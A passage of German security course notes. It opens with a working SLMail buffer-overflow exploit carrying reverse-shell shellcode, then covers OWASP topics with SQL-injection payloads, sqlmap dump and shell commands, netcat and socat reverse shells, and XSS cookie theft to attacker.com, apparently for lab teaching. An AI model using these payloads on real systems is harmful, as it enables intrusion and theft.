z8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9'
    connect_to_SLMail(ip, buffer)


def check_values_attack_input(ip):
    """Checking if EIP is filled with captial 'B' letters"""
    buffer="A"*2606 + "B"*4 + "C"*90
    connect_to_SLMail(ip, buffer)


def determine_bad_characters(ip):
    # All hex characters:
    badchars=("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
          "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
          "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
          "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
          "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
          "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
          "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
          "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
          "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
          "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
          "\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
          "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
          "\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
          "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
          "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

    # All acceptable hex characters (\x00, \x0a and \x0d have been removed):
#    badchars=("x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f"
#          "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
#          "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
#          "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
#          "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
#          "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
#          "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
#          "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
#          "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
#          "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
#          "\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
#          "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
#          "\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
#          "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
#          "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

    buffer='A'*2606 + 'B'*4 + bad_chars + 'C'*(3500-2606-4-255)
    connect_to_SLMail(ip, buffer)


def attack_with_payload(ip):
    """Use a reverse shell payload generated by msfvenom such that victim connects reverse shell to port 443 on 192.168.64.137"""
#   Determine opcode of 'JMP ESP' using
#      /usr/share/metasploit-framework/tools/exploit/nasm_shell
#
#   Opcode is FFE4
#
#  Search for this opcode in the whole slmfc.dll using mona in ImmunityDebugger:
#      !mona find -s '\xff\xe4' -m slmfc.dll
#
#  A suitable address without bad characters is:
#      5F4A358F
#
#  Veriying that this address really holds the "JMP ESP" instruction
#  using the debuggers button for "Go to address in disassembler"
#
#  slmfc is a suitable module, since it is statically loaded to the same memory address
#  and is not protected (No DEP, no ASLR, no NX). This can be confirmed by:
#     !mona modules
#
# Generate reverse shell payload using:
#    /usr/share/metasploit-framework/msfvenom -p windows/shell_reverse_tcp LHOST=192.168.64.137 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
#

    # Address has to be defined in reverse order because of little endian encoding:
    address_of_jmp_esp = '\x8F\x35\x4a\x5F'
    reverse_shell_code = ("\xbb\x4c\xd1\x2d\x04\xdb\xc9\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
                          "\x52\x31\x58\x12\x03\x58\x12\x83\x8c\xd5\xcf\xf1\xf0\x3e\x8d"
                          "\xfa\x08\xbf\xf2\x73\xed\x8e\x32\xe7\x66\xa0\x82\x63\x2a\x4d"
                          "\x68\x21\xde\xc6\x1c\xee\xd1\x6f\xaa\xc8\xdc\x70\x87\x29\x7f"
                          "\xf3\xda\x7d\x5f\xca\x14\x70\x9e\x0b\x48\x79\xf2\xc4\x06\x2c"
                          "\xe2\x61\x52\xed\x89\x3a\x72\x75\x6e\x8a\x75\x54\x21\x80\x2f"
                          "\x76\xc0\x45\x44\x3f\xda\x8a\x61\x89\x51\x78\x1d\x08\xb3\xb0"
                          "\xde\xa7\xfa\x7c\x2d\xb9\x3b\xba\xce\xcc\x35\xb8\x73\xd7\x82"
                          "\xc2\xaf\x52\x10\x64\x3b\xc4\xfc\x94\xe8\x93\x77\x9a\x45\xd7"
                          "\xdf\xbf\x58\x34\x54\xbb\xd1\xbb\xba\x4d\xa1\x9f\x1e\x15\x71"
                          "\x81\x07\xf3\xd4\xbe\x57\x5c\x88\x1a\x1c\x71\xdd\x16\x7f\x1e"
                          "\x12\x1b\x7f\xde\x3c\x2c\x0c\xec\xe3\x86\x9a\x5c\x6b\x01\x5d"
                          "\xa2\x46\xf5\xf1\x5d\x69\x06\xd8\x99\x3d\x56\x72\x0b\x3e\x3d"
                          "\x82\xb4\xeb\x92\xd2\x1a\x44\x53\x82\xda\x34\x3b\xc8\xd4\x6b"
                          "\x5b\xf3\x3e\x04\xf6\x0e\xa9\xeb\xaf\x50\xa0\x84\xad\x50\xb3"
                          "\xef\x3b\xb6\xd9\x1f\x6a\x61\x76\xb9\x37\xf9\xe7\x46\xe2\x84"
                          "\x28\xcc\x01\x79\xe6\x25\x6f\x69\x9f\xc5\x3a\xd3\x36\xd9\x90"
                          "\x7b\xd4\x48\x7f\x7b\x93\x70\x28\x2c\xf4\x47\x21\xb8\xe8\xfe"
                          "\x9b\xde\xf0\x67\xe3\x5a\x2f\x54\xea\x63\xa2\xe0\xc8\x73\x7a"
                          "\xe8\x54\x27\xd2\xbf\x02\x91\x94\x69\xe5\x4b\x4f\xc5\xaf\x1b"
                          "\x16\x25\x70\x5d\x17\x60\x06\x81\xa6\xdd\x5f\xbe\x07\x8a\x57"
                          "\xc7\x75\x2a\x97\x12\x3e\x4a\x7a\xb6\x4b\xe3\x23\x53\xf6\x6e"
                          "\xd4\x8e\x35\x97\x57\x3a\xc6\x6c\x47\x4f\xc3\x29\xcf\xbc\xb9"
                          "\x22\xba\xc2\x6e\x42\xef")
    # To avoid overwriting of the shellcode when it is decoded,
    # 16 NOPs (opcode \x90) have to be inserted at the orginial position
    # of the payload (address where ESP points to).
    buffer='A'*2606 + address_of_jmp_esp + '\x90'*16 + reverse_shell_code + 'C'*(3500-2606-4-351-16)
    print "Attacking SLMail with reverse shell payload"
    connect_to_SLMail(ip, buffer)


if __name__ == "__main__":

    import sys
    ERR_MISSING_ARGUMENT = 1
    ERR_INVALID_FORMAT = 2
    ERR_INVALID_VALUES = 3

    if (len(sys.argv)) != 2:
        print("Usage: {} IPv4-address".format(sys.argv[0]))
        sys.exit(ERR_MISSING_ARGUMENT)

    ip = sys.argv[1]
    octets = ip.split('.')
    if (len(octets) != 4):
        print "Invalid format of IP address"
        sys.exit(ERR_INVALID_FORMAT)

    for o in octets:
        try:
            num = int(o)
        except:
            print "Invalid values in IP address"
            sys.exit(ERR_INVALID_VALUES)

        if (num < 0) or (num > 255):
            print "Invalid values in IP address"
            sys.exit(ERR_INVALID_VALUES)

    ip = octets[0] + '.' + octets[1] + '.' + octets[2] + '.' + octets[3]

    print "Attacking IP " + ip

    # Win7 local VM to attack:
    # ip = 192.168.64.135

#   Fuzzing the SLMail server to find vulnerability
#    fuzz(ip)

#   Replicate the crash using a string with suitable length
#    replicate_crash(ip)

#   Send unique string to determine position of input on victim machine:
#    attack_with_unique_string(ip)

#   Determine which characters result in a truncation of the input in the memory of the victim machine
#    determine_bad_characters(ip)

#   Attack victim machine with reverse shell payload:
    attack_with_payload(ip)
```

## Aufgabe 4: Thema Sicherheit von Web-Anwendungen (4+4+3+2 = 13 Punkte)

### Evaluation verschiedener Schutzmechanismen

**Firewalls** verhindern keine Angriffe über erlaubte Ports

Beispiel: Angriffe gegen eine Web-Anwendung über das HTTP-Protokoll und TCP-Ports 80/443

**Verschlüsselung** sichert Integrität der übertragenen Daten, damit werden aber auch Angriffe "sicher" zum Zielsystem übertragen

Beispiel: Verhindern keine Angriffe gegen Serversysteme auf Anwendungsebene

**Frameworks** vermeiden Schwachstellen, da sie gut getestet sind, aber sind ein Risiko für den Datenschutz und können Fehler über dependencies einschleusen

Beispiel: Wenn über CDNs eingebunden wird jeder Aufruf beim Anbieter protokolliert - Laden viele Pakete nach

### Angriffsziele

- Applikationen, e.g. Web-Applikationen oder Datenbanken
- Dienste, e.g. Webserver, Applikationsserver
- Betriebssysteme, e.g. Windows, Linux
- Netzwerk, e.g. ARP, IP, TCP, UDP

### OWASP Top 10 Übersicht

![OWASP Top 10](./static/owasp.png)

### A1: Fehlerhafte Berechtigungsprüfung

- **Prüfung** von Zugriffsberechtigungen fehlt oder ist **fehlerhaft**
- **Beispiele**
  - Verletzung des Prinzips des kleinsten Privilegs bzw. der Zugriffsverweigeruns als Standardeinstellung
  - Umgehen der Berechtigungsprüfung durch verändern der URL
  - Unsichere direkte Objektreferenz
  - Zugriff auf eine API ohne POST PUT und DELETE Berechtigungsprüfung
  - Erweiterung der Rechte
    - Zugriff als normaler Benutzer möglich, ohne am System angemeldet zu sein
  - Manipulation von Metadaten wie e.g. erneutes Senden JWT Access Control Tokens, eines Cookies oder eines versteckten Formularfeldes
  - Fehlerkonfiguration von CORS
- **Auswirkungen**
  - Angreifer haben mehr Rechte, als ihnen eigentlich zustehen würden
  - Offenlegung von Informationen
- **Angriffsszenario** (Unsichere direkte Objektreferenz)
  - Bedrohung: Benutzer kann den Namen oder die ID eines Objektes verwenden um direkten Zugriff zu erhalten, ohne dass die Berechtigungen des Benutzers überprüft werden
  - Ursachen: Fehlende Berechtigungsprüfung für alle Objektzugriffe (Entwurfsprinzip der "Vollständigen Vermittlung")
  - Verwendung direkter Referenzen auf Objekte
- **Beispiel**
  ```java
  String query = "SELECT * FROM accts WHERE account = ?";
  PreparedStatement pstmt = connection.preparedStatement(query, ...);
  pstmt.setString(1, request.getParameter("acct"));
  ResultSetresults = pstmt.executeQuery();
  ```
  Dies kann folgendermaßen ausgenutzt werden:
  ```
  https://example.com/app/accountInfo?acct=notmyacct
  ```
- **Maßnahmen**
  - Berechtigungsprüfung ist nur effektiv, wenn diese in vertrauenswürdigem Kontext durchgeführt wird, in welchem die Metadaten von Angreifern nicht modifiziert werden kann
  - Standardmäßig Zugriff verbieten
  - Verwendung inderekter Referenzen
    - d.h. einer Abbildung ovn beliebigen evtl. zufälligen Zahlen auf die tatsächlichen Objektreferenzen
  - Nur eine Komponente zur Berechtingungsprüfung verwenden und diese wiederverwenden
  - Feingranulare Berechtigungsprüfung für jeden Objektzugriff implementieren
    - Beispiel: Benutzer darf nur auf eigene Datenbank zugreifen
  - Domänenmodelle sollten eindeutige Anforderung in Bezug auf Grenzen der Anwendungslogik erzwingen
  - Web Server Directory Listing deaktivieren
  - Metadaten und Backup-Dateien nicht in Web-Server-Verzeichnissen speichern
  - Zugriffe, die von der Berechtigungsprüfung abgewiesen wurden, protokollieren und Admins bei wiederholtem Auftreten benachrichten
  - Frequenz der Zugriffe auf APIs und Controller beschränken, um Schäden durch automatisierte Anfragen einzudämmen
  - Zustandsbehaftete Sitzungs-IDs (session IDs) nach dem Logout auf dem Server als ungültig markieren
  - Berechtigungsprüfung ausgiebig durch Funktions- und Integrationstest testen

### A2: Fehlerhafte Kryptographie

- Es werden **keine kryptographische Verfahren** verwendet
- Es werden **fehlerhafte**, **schwache** oder nicht mehr sichere **kryptographische Verfahren** oder Implementierung verwendet
- **Beispiel**
  - **HTTP**, **FTP**, telnet
  - **DES**, 3DES
  - Passwörter im Klartext speichern
- **Was wird angegriffen?**
  - Passwörter
  - Schlüssel
  - Session IDs
- **Angriffspunkte**
  - Festplatten
  - Hauptspeicher
  - Übertragung im Netzwerk
- **Angegriffene Anwendungen**
  - Datenbanken
  - Browser
- **Angriffsszenarien**
  - Kreditkartennummer werden in einer Datenbank verschlüsselt gespeichert
  - Angreifer können die Kreditkartennummern dann durch eine SQL-Injektion direkt im Klartext aus der Datenbank abfragen
  - Eine Web-Anwendung erzwingt die Verwendung von TLS **nicht** 
- **Maßnahmen**
  - Schutzbedarf der zu speichernden ermitteln
  - Klassifizieren nach Sensibilität
  - Sensible Daten nicht unnötig speichern
  - Netzwerkverkehr auf unsichere Protokolle prüfen
  - Verschlüsselung aller sensiblen Daten
  - Starke Hash-Funktion mit Salt
  - Deaktivieren von Caching

### A3: Injektionen

- Eine Anwendung ist verwundbar gegen eine Injektionsangriff, wenn sie
  - Daten, die von Benutzern geliefert werden, **nicht validiert**, filtert oder bereinigt
  - Direkt interpretierte statements ohne "escaped" zu werden
  - Feindselige Daten in den Suchparametern von ORM verwendet
  - Feindselige Daten diret verwendet oder verkettet
- **Bedrohung**
  - Angreifer **manipulieren Anfragen**, um unerwünschte Aktionen durchzuführen, Informationen zu gewinnen oder Daten zu manipulieren
- **Hauptursache**
  - Anwendung übernimmt Benutzereingaben ohne Validierung, Filterung oder Bereinigung
- **Auswirkung**
  - Auslesen und Manipulation von Datenbankinhalten
  - Umgehen der Authentifizierung
  - Vollständige Kompromittierung des Systems

#### SQL-Injection

**Example: Admin-Login**

```
http://site.com/login.cgi?user=admin'--&password=secret
```

```sql
SELECT * FROM user WHERE user='admin'--' and password='secret'
```

**Example: Benutzer zum Admin machen**

Erwarterter Aufruf:

```
http://site.com/find.cgi?id=42
```

Erzeugtes SQL:

```sql
SELECT author, subject, text FROM articles WHERE id=42
```

Aufruf durch Angreifer:

```
http://site.com/find.cgi?id=42;UPDATE%20USER%20SET%20TYPE="admin"%20WHERE%20id=13
```

Erzeugtes SQL:

```sql
SELECT author, subject, text FROM articles WHERE id=42; UPDATE USER SET TYPE="admin" WHERE id=13
```

**Example: Ausführen eines Kommandos auf Microsoft SQL Servern**

Erwarteter Aufruf:

```
http://site.com/find.cgi?search=something
```

Erzeugtes SQL:

```sql
SELECT author, subject, text FROM articles WHERE search LIKE `%something`
```

Aufruf durch Angreifer:

```
http://site.com/find.cgi?search=something';GO+EXEC+cmdshell('format+C')+--
```

Erzeugtes SQL:

```sql
SELECT author, subject, text FROM articles WHERE search LIKE '%something'; GO EXEC cmdshell('format C') --%'
```

**Example: SQL-Injektion durch blindes Vertrauen in Frameworks, z.B. Hibernate Query Language (HQL)**

```java
Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");
```

Erwarteter Aufruf:

```
http://site.com/accountView?id=1
```

Aufruf durch Angreifer:

```
http://site.com/accountView?id=' or '1'='1
```

#### Blind SQL-Injection

- Bei Blind SQL-Injections bekommt man **keine Fehlermeldungen** angezeigt
- Lediglich zwei Zustände können anhand der Ergebnisseite unterschieden werden
- **Erzeugen von Wahr/Falschaussagen**
  ```
  WHERE id='$id' and ASCII(SUBSTRING(SYSTEM_USER,1,1)) = 65
  ```
- Dieser Prozess kann mit `sqlmap` automatisiert werden

```
sqlmap -u http://192.168.1.42 --crawl=1
```

`Crawl` gibt die Tiefe an bis zu der Hyperlinks verfolgt werden sollen.

Sämtliche mögliche Daten aus der Datenbank über verwundene Parameter auslesen:

```
sqlmap -u http://192.168.1.42/aktion.php?4711 --dbms=mysql --dump --threads=5
```

`dump` sorgt für Auslesen der Daten.
`threads` gibt an mit wie vielen Threads gleichzeitig `sqlmap` arbeiten soll.

```
sqlmap -u http://192.168.1.42/aktion.php?4711 --dbms=mysql --os-shell
```

```bash
--dbs # Datenbanken auf dem Zielsystem auflisten
--batch # Keine Interaktionen mit dem Nutzer
--level=<LEVEL> # Testtiefe, LEVEL kann die Werte 1 bis 5
--risk=RISK # Risikostufe der durchzuführenden Tests; RISK kann die Werte 1 bis 3 haben
--identify-waf # Web Applications Firewall identifizieren
--tamper=SCRIPT # Web Application Firewall umgehen, e.g --tamper=apostrophemask, apostrophenullencode
--dbms=DBMS # Datenbanksystem nicht automatisch identifizieren, sondern die Angabe von DBMS verwenden
--all # Alle mögliche Informationen automatisch ermitteln, e.g. Datenbank mit Version, Standardtabellen, -splaten, -benutzen etc.
```

**Typisches Vorgehen**

- Request mit BURP-Suite abfangen und in Datei abspeichern

#### SQL-Injection-Demos

```sql
Demo #1: SQL-Injection
Provozieren einer Fehlermeldung
'

Auslesen der Datenbankversion
1' UNION SELECT @@version; #
1' UNION SELECT null,@@version; #

Auslesen der Tabellen/Spalten:
' UNION SELECT table_schema,table_name FROM information_schema.tables;#
' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'users';#

Auslesen der Benutzertabelle:
' UNION SELECT user,password FROM users;#

Auslesen von Dateien:
' UNION SELECT null,LOAD_FILE('/etc/passwd');#
1' UNION SELECT null,LOAD_FILE('/etc/passwd');#

Demo mit sqlmap:
sqlmap -u "http://opfer/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low;PHPSESSID=6tifu4kbh73mve4auu75gq0133" -p id --string="Surname"

Mögliche Optionen:
-f, --current-db, -D dva tables, -D dvwa -T users --dump

Demo #2: Blind-SQL-Injection
Demo mit sqlmap:
sqlmap -u "http://opfer/dvwa/vulnerabilities/sqli_blind/index.php?id=1&Submit=submit" --cookie="security=low;PHPSESSID=6tifu4kbh73mve4auu75gq0133" -p id --string=Surname

Mögliche Optionen:
-f, -b, --current-user,--dbs, -D dvwa tables, -D dvwa -T users --dump
```

#### DVWA

**Low-Level**

```sql
'OR '1' = '1' UNION ALL SELECT first_name, password FROM users;#
'OR '1' = '1' UNION ALL SELECT version(), user();#
```

```sql
?id=a'%20UNION%20SELECT%20first_name,%20password%20FROM%20users;--%20-&Submit=Submit
```

**Medium-Level**

Escape String but not having quotes around parameter

```sql
?id=a%20UNION%20SELECT%20first_name,%20password%20FROM%20users;--%20-&Submit=Submit
```

#### Gegenmaßnahmen

- Direkten Aufruf von Interpretern möglichst vermeiden
- Falls Aufruf eines Interpreter unvermeidbar, dann sichere APIs verwenden
- Verwende Prepared Statements (e.g. in Java mit JDBC)
  ```java
  PreparedStatement pstmt = con.prepareStatemnt("SELECT * FROM users WHERE user=? and password=?");
  pstmt.setString(1, username);
  pstmt.setString(2, password);
  ```
- PHP Data Objects
- Bei dynamischen Abfragen Strings escapen
- LIMIT verwenden, damit nicht Massenhaft Datensätze entnommen werden können
- Web Application Firewalls e.g. heruasfiltern gefählicher Zeichen wie e.g. \ " ' oder ;
- Durchgängige Server-seitige Eingabevalidierung
- Nur tatsächlich erforderliche Rechte für Datenbankbenutzer

#### Command Injection

Einschleusen von **Befehlen**, die **direkt** vom Betriebssystem **verarbeitet** werden.

Um zu prüfen, welche der Anwendungen installiert ist, kann `which` verwendet werden e.g. `which socat`.

Netcat:

```bash
nc -lnvp 4242 # Listener
;nc -e /bin/sh 10.0.0.1 4242 # Victim
```

Socat:

```bash
socat -dd TCP4-LISTEN:4443 STDOUT # Listener
;socat TCP4:10.0.0.1:4443 EXEC:/bin/bash
```

#### Cross-Site Scripting (XSS)

**Einschleusen** von "schadhaftem" **Skriptcode** in den Browser des Opfers. Charakteristisch ist, dass der Schadcode im Kontext und mit Zugriffsrechten des Opfers ausgeführt wird.

**Reflektiertes XSS**

Benutzereingabe wird vom Server direkt zurückgegeben 

- Skriptcode wird im Browser des Opfers interpretiert

Normaler Aufruf:

```
http://searchengine.com?query=Suchbegriff
```

```
Sie suchten nach: Suchbegriff
```

Angriff:

```
http://searchengine.com?query=
<script">alert("XSS")</script>
```

```
Sie suchten nach: <sript ...>...</script>
```

DVWA:

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?>
```

Exploit:

```
<script>alert("Hallo")</script>
```

**Persistentes Cross-Site Scripting**

Skriptcode wird dauerhaft innerhalb der Anwendung gespeichert (z.B. bei Foren, Gästebüchern, MySpace)

- Code wird in einer Datenbank gespeichert und bei jedem Aufruf wieder ausgegeben
- Der Skriptcode wird anschließend unbemerkt im Browser des Anwenders ausgeführt

Angriff:

- Gästebuch zeigt Einträge auf Website an
- Schadcode kann über URL oder Formulare eingefügt werden

```
http://guestbook.com?entry=Tolle%20Seite!<script>
alert("XSS")</script>
```

Ergebnis:

```
Tolle Seite!<script>alert("XSS")</script>
```

DVWA:

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitize name input
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

Exploit: 

```
<script>alert("hello")</script>
```

**Lokales (DOM-basiertes) Cross-Site Scripting**

Beispiel:

```html
<h1>Welcome!</h1>
Hi
<script>
  var pos = document.URL.indexOf("name=") + 5;
  document.write(document.URL.substring(pos, document.URL.length));
</script>
<br />
Welcome to our system...
```

Normaler Aufruf:

```
http://site.com/welcome.html?name=John
```

Angriff:

```
http://site.com/welcome.html#name=John<script>
alert("XSS")</script>
```

- `#` zeigt dem Browser an, dass nachfolgende Zeichen ein Fragment sind, d.h. der Parameter wird nicht an den Server übertragen und dort nicht geprüft werden.
- Angriff funktioniert nicht, wenn der Browser bereits URL-Kodierung verwendet, d.h. < und > durch `%3C` und `%3E` ersetzt

**Session Hijacking mit XSS**

- Fehlerhafter Servlet-Code
  ```
  (String) page += "<input name='creditcard'
  type='TEXT' value='" + request.getParameter("CC") +
  "'>";
  ```
- Angriff durch Angabe des folgendes Werts für `CC`:
  ```
  '><script>document.location='http://www.attacker.com
  /cgi-bin/cookie.cgi?
  foo='+document.cookie</script>'
  ```

Ergebnis:

- Angreifer erhält Cookie des Benutzers
- Im Cookie ist i.d.R. die Session ID gespeichert

#### Gegenmaßnahmen

- Client- und Server-seitige **Eingabevalidierung**
  - Prüfe alle Eingabedaten bevor sie zur Speicherung akzeptiert oder angezeigt werden
  - Prüfung auf Länge, Typ, Wertebereich, Syntax oder Geschäftsregeln
  - Verwende Positivliste bei der Eingabeprüfung "akzeptiere nur als gutartig bekannte Daten"
- Ziehe die **Positivliste** (white list) immer der Negativliste (black list) vor
- **Ausgabekodierung**
  - Stelle sicher, dass alle Benutzereingaben als HTML- oder XML-Entitäten kodiert sind, bevor diese ausgegeben bzw. gerendert werden
  - Die meisten Frameworks stellen Methoden zur Ausgabekodierung zur Verfügung (php hat `htmlspecialchars()` oder `htmlentities()`)
- **Content-Security-Policy**, teilt dem Browser mit, welche Domains er als Quelle von vertrauenswürdigem JavaScript-Code akzeptieren soll
  - Verstöße werden in der Browser-Konsole gemeldet
  - Ist CSP aktiv, wird in HTML-Dokumenten eingebetteter JavaScript-Code standardmäßig nicht mehr ausgeführt
  - Deaktiviert standardmäßig auch die `eval()` Funktion von JavaScript
  - `Content-Security-Policy: default-src 'self'` akzeptiert nur vom eigenen Server geladenen Code
  - Events wie `onclick` funktionieren auch nicht mehr

Script mit Positivliste gegen lokales XSS

```
<script>
	var pos=document.URL.indexOf("name=")+5;
	var name=document.URL.substring(pos, document.URL.length);
	if (name.match(/^[a-zA-Z0-9]$/)) {
		document.write(name);
	} else {
		window.alert("Security error");
	}
</script>
```

#### Cross-Site-Request-Forgery

- **Ersetzen** in einer **Referenz** in einem HTML-Dokument durch **Referenz** auf eine **andere Web-Seite**
- Ein CSRF-Angriff **zwingt** den **Browser** eines Opfers, das sich korrekt authentifiziert hat, dazu, einen **Request an eine verwundbare Webanwendung** zu schicken, die dann die vom Angreifer **gewünschte Aktion im Namen des Opfers ausführt**
- **Beispiel**
  ```html
  <img src="http://www.example.com/transfer.do? frmAcct=document.form.frmAcct&toAcct=4345754& toSWIFTid=434343&amt=3434.43">
  ```
  Oben stehendes Tag kann auf Seite des Angreifers stehen und ist
  erfolgreich, wenn der Browser des Benutzers noch für das Online-
  Banking authentifiziert ist.

**Hauptursache**
 - Browser sendet Berechtigungen in Form von Cookies mit - werden durch XSS begünstigt

**Gegenmaßnahmen**

- Generieren von nicht vorhersagbaren Autorisierungstokens, welche nicht automatisch mitgesendet werden
- Anschließend verifizieren, dass die abgeschickten Werte für Name und Wert für den aktuellen Benutzer korrekt sind
